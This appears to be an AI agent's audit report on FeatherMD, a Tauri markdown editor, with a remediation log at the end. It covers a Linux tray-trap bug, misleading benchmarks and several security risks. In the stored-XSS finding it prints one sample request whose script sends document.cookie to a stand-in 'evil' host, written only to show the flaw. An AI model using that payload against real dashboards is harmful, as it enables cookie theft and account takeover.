# FeatherMD — Zero-Trust Production Audit #2 (rewritten, deep pass)

**Date:** 2026-06-11
**Method:** Full static analysis + execution-flow reasoning over the entire working tree — `src/` (every module), `src-tauri/` (`lib.rs`, `main.rs`, `build.rs`, `Cargo.toml`, capabilities, `tauri.conf.json`), `analytics/index.js`, **all** `tests/`, `scripts/generate-report.js`, `.github/workflows/{ci,release,deploy-pages}.yml`, `vite/vitest/eslint` configs, and all four stylesheets. This pass re-reads the files audit-01 only summarized, verifies audit-01's claims against current source, and audits the **current session's changes** (system tray, 10 reader fonts, image hardening, and the audit-01 remediations) under the same zero-trust lens.
**Constraint:** Per `.agents/rules`, no `build`/`test`/`lint`/`cargo` commands were executed. Findings are reasoned, not run.

---

## Executive Summary

FeatherMD is a **real, honestly-built** Tauri v2 desktop markdown editor. Execution flow is genuine end-to-end: CodeMirror 6 → marked + DOMPurify + lazy KaTeX/Mermaid/hljs → Rust IPC (`get_initial_file`, `watch_file`, `unwatch_file`) → OS file watching via `notify`. The test suite is **real and behavioral** (not snapshot theater) for the pure-logic modules. There are **no hallucinated APIs** anywhere in the app.

Audit-01's serious findings are **genuinely fixed** in the current tree (verified line-by-line): the `isProgrammaticSetting` data-loss race (now a CodeMirror `Annotation`), per-cursor-move full-document stats (now edit-only), the zoom config-write flood (debounced), config write serialization (a promise queue), config schema validation (`sanitizeConfig`), and the "no telemetry" welcome-text lie (now an honest disclosure). Two dead CSS classes were removed.

But the deep pass surfaced material problems that audit-01 missed or that this session introduced:

1. **A cross-platform-critical regression (this session):** "close → hide to tray" can leave a **trapped, unrecoverable window** on Linux desktops that don't host tray icons (stock GNOME), and the `build(app)?` is failure-fatal to startup.
2. **A real stored-XSS in the analytics dashboard** (client-controlled `platform`/`version` interpolated into HTML unescaped) — new finding, not in audit-01.
3. **Tooling theater in the "compliance" pipeline:** the report's "CPU idle / polling" check only scans `src/main.js` (non-recursive), and the word-count benchmark measures a **fake local function**, not the real `stripMarkdown` path.
4. The standing security posture (`fs:scope: "**"`, signing key in the repo tree, unauth analytics dashboard, CSP wildcard) is **unchanged**.

**Bottom line: solid and shippable on Windows; the Linux bundles and the analytics service are not safe as-is.**

---

## What changed since audit-01 (verified against current source)

| audit-01 ID | Status now | Evidence |
|---|---|---|
| CF-1 / CF-2 (programmatic-flag race → data loss) | **FIXED** | [editor.js](../../src/editor/editor.js): `Annotation.define()` tags `setValue`; listener reads `update.transactions.some(tr => tr.annotation(...))` |
| CF-3 / PR-1 (full-doc stats every cursor move) | **FIXED** | [status-bar.js](../../src/ui/status-bar.js): `updateCursorPosition` no longer calls `getValue()`/full `countStats` |
| RR-1 / PR-3 (zoom `saveConfig` flood) | **FIXED** | [keyboard.js](../../src/core/keyboard.js): `persistZoomDebounced()` (400 ms) |
| RR-2 (no write serialization) | **FIXED** | [config.js](../../src/core/config.js): `saveChain` promise queue |
| TS-2 (no config validation) | **FIXED** | [config.js](../../src/core/config.js): `sanitizeConfig()` clamps/coerces all fields |
| SR-2 (telemetry contradiction) | **FIXED** | [welcome.js](../../src/core/welcome.js): honest "anonymous ping" disclosure |
| DC-2 / DC-3 (`.menu-panel-wide`, `.header-separator`) | **REMOVED** | absent from [base.css](../../src/styles/base.css) |
| CF-4 (toggle `data-checked` string/bool inconsistency) | **OPEN** | [toolbar.js:90-112](../../src/ui/toolbar.js) |
| DC-1 (`#unsaved-dialog-message`) | **KEPT (intentional)** | asserted by [html.test.js:64](../../tests/html.test.js) — dead in app, alive in test contract |
| DC-4 (`--bg-editor` redundant) | **OPEN** | every theme block sets it equal to `--bg` |
| SR-1 (signing key in repo tree) | **OPEN** | literal `~/` dir still in repo root |
| SR-3 (CSP `*.github.com`) | **OPEN** | [tauri.conf.json:27](../../src-tauri/tauri.conf.json) |
| SR-4 / RR-6 (`fs:scope: "**"`) | **OPEN** | [capabilities/default.json](../../src-tauri/capabilities/default.json) |
| SR-6 (analytics dashboard unauth) | **OPEN** | [analytics/index.js:66](../../analytics/index.js) |
| MP-1 (`#status-encoding` hardcoded UTF-8) | **OPEN** | [index.html](../../index.html); asserted by html.test.js |

---

## Critical Failures
*(actual production blockers)*

### CF2-1 — "Hide to tray" on close can trap the window on Linux / abort startup (NEW, this session)

[lib.rs](../../src-tauri/src/lib.rs) builds a tray in `setup()`; [main.js `onCloseRequested`](../../src/main.js) now `appWindow.hide()` instead of `destroy()`. Correct for the 0-byte-PDF problem **on Windows**, but it created Linux failure modes the Windows dev box never sees:

1. **No tray host → unrecoverable window.** Bundles target `deb` + `appimage` ([tauri.conf.json](../../src-tauri/tauri.conf.json) `bundle.targets`). On stock GNOME (Fedora Workstation, vanilla GNOME) `StatusNotifierItem` tray icons do **not** display without the AppIndicator extension. `release.yml` installs `libappindicator3-dev` at **build** time, which does nothing for the **end user's** desktop. Click X → window hides → no tray icon → and `main.rs` sets `windows_subsystem = "windows"` only on Windows, but on Linux there's still no console and Ctrl+Q can't reach an unfocused/hidden window. Result: a background process the user must `kill`.
2. **`tray_builder.build(app)?` is failure-fatal.** The `?` propagates `Err` out of `setup`, so any platform/session where tray creation fails → the **app does not launch at all**.
3. **No single-instance guard.** Tauri single-instance is not configured. With windows that "close" by hiding, relaunching via the `.md` file association spawns a **second** process while the first still holds the file watcher → two watchers, two trays, divergent buffers.

**Severity:** Critical for the Linux bundles; low for Windows.
**Fix direction:** Don't `?`-abort — build the tray defensively, record whether it succeeded, and in `onCloseRequested` only `hide()` when a tray is actually present; otherwise fall back to the guarded quit. Add `tauri-plugin-single-instance`.

### CF2-2 — Tray hide is undiscoverable (NEW)

Even on Windows, X makes the window vanish from screen **and taskbar** with zero feedback. Users conclude it crashed, then a second launch reuses/duplicates the hidden process. Standard tray apps show a one-time "still running in the tray" balloon. This directly generates "the app won't close / won't reopen" reports. **Severity:** Medium (High on perceived quality).

### CF2-3 — Stored XSS in the analytics dashboard (NEW, not in audit-01)

[analytics/index.js:85-94](../../analytics/index.js) builds the dashboard rows by interpolating `user.platform`, `user.version`, and `user.ip` **directly into HTML with no escaping**. `platform` and `version` originate from the client ping ([:42-45](../../analytics/index.js)), stored verbatim via `decodeURIComponent`. An attacker who finds the Railway URL can:
```
POST /ping?version=v1&platform=<script>fetch('//evil/'+document.cookie)</script>
```
…and the payload executes in **the developer's browser** when they open `GET /`. The endpoint has **no auth and no rate limit**, so the same actor can also flood Postgres (DB-fill / cost-amplification DoS). `version`'s only treatment is `.replace(/^v/, '')` — not escaping.

**Severity:** Medium-High (stored XSS; blast radius limited to the internal vanity dashboard, but it is a genuine injection on attacker-controlled data). **Fix:** HTML-escape every interpolated field; add auth + rate limiting to the server.

---

## Hallucinated or Fake Code

**No hallucinated APIs.** Tauri 2.11 tray/menu (`TrayIconBuilder`, `MenuItem`, `show_menu_on_left_click`, `TrayIconEvent::Click`), `plugin-process` `exit`/`relaunch`, `plugin-updater` `check`/`downloadAndInstall`, CodeMirror 6 `Annotation`, marked/DOMPurify/KaTeX/Mermaid, and the `notify` crate are all used correctly and exist. Imports resolve. No invalid patterns.

Two **placeholders dressed as features** were found:

### MP2-1 — Updater progress "0%" that never advances
[updater.js:80-89](../../src/platform/updater.js): on `Started` the button shows **"Downloading… 0%"**, then every `Progress` event reverts to **"Downloading…"** with no percentage. `contentLength` is captured and `chunkLength` is available, but nothing accumulates them. The "0%" implies a progress readout that does not exist. Low severity, classic "looks complete, isn't."

### MP2-2 — Hardcoded `#status-encoding` "UTF-8" (carried from audit-01)
[index.html](../../index.html) shows a static "UTF-8" never updated by JS, and [html.test.js:183](../../tests/html.test.js) even asserts it. Technically correct (files are read as UTF-8) but it's a static value masquerading as a live indicator.

---

## Dead Code

- **DC2-1 — `#unsaved-dialog-message`**: dead in the app, **kept on purpose** (html.test.js asserts it). Removing requires editing the test too.
- **DC2-2 — `--bg-editor`**: every theme in [base.css](../../src/styles/base.css) sets it equal to `--bg`; only a fallback consumer in [editor.css:9](../../src/styles/editor.css). Redundant; safe to drop.
- **DC2-3 — `windowResizeUnlisten` guard** ([window.js](../../src/platform/window.js)): unreachable (`initWindowSize` runs once).
- **DC2-4 — Stale test fixture (NEW)**: [toolbar.test.js:75-77,351](../../tests/ui/toolbar.test.js) still uses `data-font="'JetBrains Mono', monospace"` / `monospace`. The real menu now has 10 reader fonts. The test **still passes** (self-contained fixture testing generic behavior) but encodes a UI that no longer exists. Update the fixture.
- **DC2-5 — `closeWindow` removed**: confirmed no remaining importers after this session's rename to `requestQuit` (no dead export left behind).

---

## Architecture Theater

The **app** has none — re-confirmed. No repository/service wrappers over single calls, no fake DI, no unused scalability hooks; every module is imported and used. The new `--font-reading` variable and `DEFAULTS`/`sanitizeConfig` split are proportionate.

The **tooling**, however, contains two pieces of measurement theater:

### AT2-1 — "CPU idle / polling" compliance check scans one file
[generate-report.js:140-151](../../scripts/generate-report.js): `fs.readdirSync(src)` is **non-recursive**, then filtered to `file.endsWith('.js')` — at the top level that's **only `main.js`**. The report then prints "0 background loops found (Event-driven)" / "All background setInterval timers have been purged" as a global compliance PASS, while actually checking ~1 of ~20 source files. `keyboard.js`, `sync.js`, etc. are never scanned. (They happen to be clean, so the conclusion is true by luck, not by verification.) Same blind spot in [security.test.js](../../tests/security.test.js), which checks only `main.js` + `editor.js`.

### AT2-2 — Word-count benchmark measures a fake function
[performance.bench.js:58-64](../../tests/performance.bench.js): the "Live Word Count Speed" bench defines its **own** `countWords = text.trim().split(/\s+/)` and benchmarks *that* — not the real [status-bar.js](../../src/ui/status-bar.js) `countStats`/`stripMarkdown` (the 16-regex pipeline that actually runs on edits, i.e. the exact code path CF-3 was about). The report surfaces this number as if it reflects app performance. The render-latency benches *are* real (`api.renderMarkdown`).

### AT2-3 — Duplicated print stylesheets
Two independent `@media print` blocks exist: [preview.css:400-474](../../src/styles/preview.css) and [toolbar.css:31-131](../../src/styles/toolbar.css). Both hide header/status/editor/divider and both handle `<pb>` page breaks; toolbar.css also `!important`-forces light theme variables, which partially duplicates what `initPrintThemeOverride` does in JS for the CSS-variable layer (the JS swap is still required for Mermaid SVG recolor). Not broken, but split print logic across two files + JS is a maintenance trap.

---

## Runtime Risks

- **RR2-1 — CF-3 fix incomplete for select-all:** `updateCursorPosition` still runs `countStats(selectedText)` per selection change; **Ctrl+A** makes that the whole document → the 16-regex pass runs on the full doc on that one event. Far rarer than the per-keystroke case that was fixed.
- **RR2-2 — Font migration gap (NEW):** upgraders persisted `fontFamily = "'JetBrains Mono', monospace"`; that now drives `--font-reading`, so their **preview renders monospace** with **no Font-menu checkmark**. A one-line migration (old mono default → Inter) would fix it.
- **RR2-3 — Double-quit re-entrancy:** tray "Quit" and Ctrl+Q both call `requestQuit()` → `showUnsavedDialog()`; two fast triggers can stack two dialogs. No in-flight guard.
- **RR2-4 — `addToRecentFiles` fire-and-forget `saveConfig()`** ([file-io.js](../../src/core/file-io.js)): unchanged from audit-01; the new write-queue makes interleaving safe, but the call is still un-awaited.
- **RR2-5 — Scroll-sync `activeSource` staleness:** [sync.js](../../src/core/sync.js) sets source only on `mouseenter`; keyboard scrolling in a never-hovered pane leaves it stale. Cosmetic.
- **RR2-6 — Rust not compiled in CI:** [ci.yml](../../.github/workflows/ci.yml) runs `npm run report` (JS build + lint + tests + bench) but **no `cargo check`**. Rust is only compiled in [release.yml](../../.github/workflows/release.yml) on a `v*` tag. A Rust compile error in `lib.rs` (e.g. the new tray code) would pass every push/PR and only blow up at release.

---

## Security Risks

- **SR2-1 (HIGH) — `fs:scope: "**"`** ([capabilities/default.json](../../src-tauri/capabilities/default.json)): full-filesystem read/write for the WebView. Combined with `watch_file` ([lib.rs](../../src-tauri/src/lib.rs)) accepting an **un-validated** path from the frontend, a WebView compromise is total-filesystem. Standing.
- **SR2-2 (CRITICAL hygiene) — signing key in repo tree:** literal `~/.tauri/feathermd.key` inside the working copy. `.gitignore` protects git, not backup/cloud-sync/CI-artifact tooling. Move to real `%USERPROFILE%\.tauri\`.
- **SR2-3 (MED-HIGH) — stored XSS + open `/ping`** (analytics): see CF2-3. Unescaped client data + no auth + no rate limit.
- **SR2-4 (MED) — analytics logs client IP** ([analytics/index.js:48-51](../../analytics/index.js)): PII stored unbounded; still undisclosed server-side (the welcome text only covers the client payload).
- **SR2-5 (MED) — CSP `connect-src https://*.github.com`** ([tauri.conf.json:27](../../src-tauri/tauri.conf.json)): wider than the updater needs. (Deferred — narrowing risks the updater chain; needs a live update test.)
- **SR2-6 (LOW) — DB connection `rejectUnauthorized: false`** ([analytics/index.js:12](../../analytics/index.js)): accepts any TLS cert for Postgres (MITM on the DB link).
- **SR2-7 (LOW) — dashboard unauthenticated**: anyone with the URL sees every user's IP/platform/version.
- **Confirmed-safe (not findings):** DOMPurify strips `<script>`/`<iframe>`/`<style>`/`on*`/`javascript:` (verified by [preview.test.js](../../tests/preview/preview.test.js)); KaTeX `trust:false` blocks `\href{javascript:}` (verified by [math-mermaid.test.js](../../tests/preview/math-mermaid.test.js)); Mermaid `securityLevel:'strict'`; `withGlobalTauri:false`; the dead `read_file`/`write_file` IPC commands are gone (verified by [security.test.js](../../tests/security.test.js)). The image-resolution hardening this session correctly skips `http(s)/data/blob/asset` and only rewrites real on-disk paths.

---

## Type Safety Risks

Plain JS, **zero static typing** — unchanged. TS-2 is now mitigated: `sanitizeConfig()` clamps/coerces every config field on load, closing the concrete corruption hole. Remaining:
- **TS2-1** — `window`-backed globals (`currentFilePath`, `isDirty`, `lineEnding`, `isSaving`, [state.js](../../src/core/state.js)) have no validation; any module can assign any type. eslint declares them as writable globals, so `no-undef` won't catch typos either.
- **TS2-2** — `parseInt(item.getAttribute('data-tab'), 10)` ([toolbar.js](../../src/ui/toolbar.js)) → `NaN` if the attr is ever malformed → `EditorState.tabSize.of(NaN)`. Latent (HTML always supplies valid values).

---

## Performance Risks

- **PR2-1 / PR2-2 (resolved):** per-cursor stats and zoom-write flood — fixed.
- **PR2-3 (open) — ReDoS-ish `stripMarkdown`:** the fenced-code regex `^(`{3,}|~{3,})[\s\S]*?^\1\s*$` ([status-bar.js:117](../../src/ui/status-bar.js)) backtracks on a large **unclosed** fence. Exposure dropped sharply (edits/selection only, not every cursor event) but a pathological paste can still stall the status-bar update.
- **PR2-4 (open) — no rAF batching** on `applyStats` writes; minor layout-thrash alongside CodeMirror DOM writes.
- **PR2-5 — render benchmark is real, word-count benchmark is not** (AT2-2): the metric most relevant to CF-3 isn't actually measured.

---

## Production Readiness Score

| Category | Score | Notes |
|---|---|---|
| Core feature completeness | 9/10 | Editor, preview, math/diagrams, themes, print, file I/O, watcher all real |
| Cross-platform safety | 4/10 | **Tray hide traps/aborts on Linux (CF2-1); no single-instance** |
| Error handling | 6/10 | Many silent `catch {}`, but no fake recovery |
| Performance | 8/10 | Real cliffs (CF-3/RR-1) removed this session |
| Security (app) | 5/10 | `fs:scope **`, key-in-repo, CSP wildcard |
| Security (analytics svc) | 3/10 | Stored XSS + unauth + no rate limit + IP logging |
| Type safety | 3/10 | No TS; config now validated |
| Data integrity | 6/10 | Config sanitized + write-serialized; still no atomic write |
| Test authenticity | 7/10 | Real behavioral tests; gaps + one stale fixture + benchmark theater |
| CI/CD | 6/10 | JS gated (build/lint/test); **Rust uncompiled until release**; polling check is theater |
| Deployment readiness | 6/10 | Windows good; Linux blocked by CF2-1 |

**Overall: 6 / 10.** Real correctness/perf gains this session, offset by a new cross-platform blocker and a genuine analytics-server vulnerability that audit-01 didn't catch.

---

## Engineering Authenticity Score

| Aspect | Assessment |
|---|---|
| Module boundaries, lazy-loading, LRU caches, file watcher | **Genuine** |
| CF-1 annotation / CF-3 / config hardening (this session) | **Genuine, idiomatic** |
| System tray (this session) | **Genuine API**, **incomplete platform handling** (CF2-1) |
| Test suite | **Real behavioral tests** — but coverage gaps (no file-io/keyboard/status-bar/config/tray/image tests) |
| Compliance report / word-count bench | **Partly theater** (AT2-1, AT2-2) |
| Updater progress UI | **Partly fake** (MP2-1) |
| Analytics server | **Real Express/PG**, but insecure (CF2-3) |
| Welcome "no telemetry" claim | **Now honest** |

**Authenticity: ~85% genuinely engineered, ~15% rough edges / measurement theater.** No deception in the core product; the theater is confined to the self-grading tooling and two placeholder UIs.

---

## Final CTO Verdict

- **Senior engineer review?** **Conditional pass.** Blocks: CF2-1 (Linux tray trap + fatal `?`), SR2-1 (`fs:scope **`), SR2-2 (key in repo). The session's CF/RR/TS fixes are exactly right.
- **Open-source maintainer review?** **Pass on Windows, reject the Linux bundles** until hide-to-tray is guarded + single-instance added. A maintainer would also flag AT2-1/AT2-2 as misleading "compliance" output.
- **Startup production deploy?** **Ship Windows.** Signed updater, CI gates JS, core flows real and now hardened. Gate Linux behind CF2-1; take the analytics server down or fix CF2-3 first.
- **Security review?** **No.** `fs:scope **`, signing key in tree, and the analytics stored-XSS/unauth dashboard are hard fails. SR-2 (disclosure) is the one that improved.
- **Real-world scale?** **N/A** (single-user desktop). The analytics endpoint would need auth + rate limiting before it ever mattered.

---

## Remediation Priority

| Priority | Item | Why |
|---|---|---|
| **P0** | CF2-1: guard hide-to-tray on tray availability; don't `?`-abort tray build; add single-instance plugin | Prevents trapped/headless Linux windows |
| **P0** | CF2-3: HTML-escape analytics dashboard fields; add auth + rate limit to `/ping` | Stored XSS + open write endpoint |
| **P0** | SR2-2: move signing key out of repo tree | Key exposure to non-git tooling |
| **P1** | SR2-1: narrow `fs:scope` + validate `watch_file` path | WebView-compromise blast radius |
| **P1** | RR2-6: add `cargo check`/`clippy` to CI | Rust errors currently escape until release |
| **P1** | CF2-2: first-run "running in tray" hint | "App won't close" confusion |
| **P2** | AT2-1: make the polling audit recursive | Compliance output is currently misleading |
| **P2** | AT2-2: benchmark the real `countStats`, not a local stub | Metric must measure shipped code |
| **P2** | RR2-2: migrate old mono `fontFamily` → Inter | Upgraders get mono preview otherwise |
| **P2** | MP2-1: compute real updater % or drop "0%" | Honesty |
| **P3** | SR2-4/5/6/7, DC2-2/4, PR2-3/4, TS2-2, AT2-3, MP2-2 | Cleanup / hardening |

---

## Verification status (honest)

- **Not executed:** `npm run build`, `npm test`, `npm run lint`, `cargo check`/`build` — all skipped per `.agents/rules`. The working tree contains **uncommitted** session changes.
- **Reasoned with confidence:** the JS session changes introduce no unused vars (eslint `no-unused-vars` is a warning, but `report` runs `--max-warnings=0`, so this matters), no `setInterval`, and no `read_file`/`write_file` strings in `lib.rs` — so the existing test/lint gates should still pass. The **Rust tray code is unverified by any automated gate** until a release build; a manual `cargo check` is the single most valuable next step before trusting CF2-1's fix or this session's `lib.rs` edits.

---

## Remediation Log (applied after this audit)

Fixes landed in the working tree following this audit (uncommitted; **not yet built/tested** per rules):

| ID | Fix |
|---|---|
| **CF2-1** | Tray + close-to-tray made **Windows-only** (`#[cfg(target_os = "windows")]`); tray build is **defensive** (logs instead of `?`-aborting) and records success in `TrayActive`; new `tray_active` command lets the frontend fall back to **quit-on-close** when no tray exists; **`tauri-plugin-single-instance`** added (focuses the running instance + forwards a file arg via `open-file-from-args`). |
| **CF2-2** | One-time native "Still running in the tray" info dialog before the first hide (gated by `config.trayHintShown`). |
| **CF2-3** | Analytics dashboard now **HTML-escapes** every dynamic field (`ip`/`version`/`platform`/`open_count`/`timestamp`); `/ping` gained an in-memory **per-IP rate limit** (30/min) and `safeDecode`; dashboard now behind **HTTP Basic Auth** (`DASHBOARD_PASSWORD`/`DASHBOARD_USER`). Telemetry/logging retained per request. |
| **SR2-1 (partial)** | `watch_file` now **validates** the path is an existing file before watching. (Blanket `fs:scope "**"` retained — see deferrals.) |
| **SR2-5** | CSP `connect-src` wildcard `https://*.github.com` removed; `https://release-assets.githubusercontent.com` added for the updater. |
| **RR2-2** | Legacy mono `fontFamily` default migrated to the Inter reader default in `sanitizeConfig`. |
| **RR2-6** | New CI `rust-check` job (`cargo check` after a frontend build) — Rust now compiled on every push/PR. |
| **AT2-1** | `generate-report.js` polling scan made **recursive** (was only seeing `src/main.js`). |
| **AT2-2** | Word-count benchmark now calls the **real** exported `countStats`, not a local stub. |
| **MP2-1** | Updater shows a **real** download percentage (accumulates `chunkLength` / `contentLength`). |
| **CF-4** | All four View-menu toggles now write `data-checked` consistently as `'true'`/`'false'`. |
| **TS2-2** | `set-tab` guards against `NaN` from a malformed `data-tab`. |
| **DC2-2** | Redundant `--bg-editor` removed from all themes + `editor.css` + `toolbar.css`. |
| **DC2-4** | Stale `toolbar.test.js` font fixture updated to the current reader fonts. |

**Deferred (with reason):**
- **SR2-1 (full `fs:scope` narrow)** — a general file editor legitimately opens/saves/watches user-chosen paths anywhere; narrowing the static scope risks breaking that and can't be verified without interactive testing. The `watch_file` validation is the safe, high-value half.
- **SR2-6 (`rejectUnauthorized: false`)** — managed Postgres (Railway) commonly serves certs that fail strict validation; flipping it risks breaking the live DB connection. Left as an accepted, documented risk.
- **SR2-4 (IP logging)** — retained intentionally (telemetry kept per request).
- **AT2-3 (print-stylesheet dedup)**, **PR2-3 (ReDoS-ish `stripMarkdown`)**, **PR2-4 (rAF batching)**, **MP2-2 (`#status-encoding`)** — low value and/or behavior-changing with no test coverage; not safe to do blind. `#status-encoding` is genuinely accurate (UTF-8 only) and test-locked.
- **SR2-2 (signing key)** — excluded per request (manual key-move; won't touch a private key).

**Unverified:** no `cargo check` / `npm test` / `npm run report` were run (rules). The new Rust dep + tray code and the analytics/server changes are reasoned, not executed.
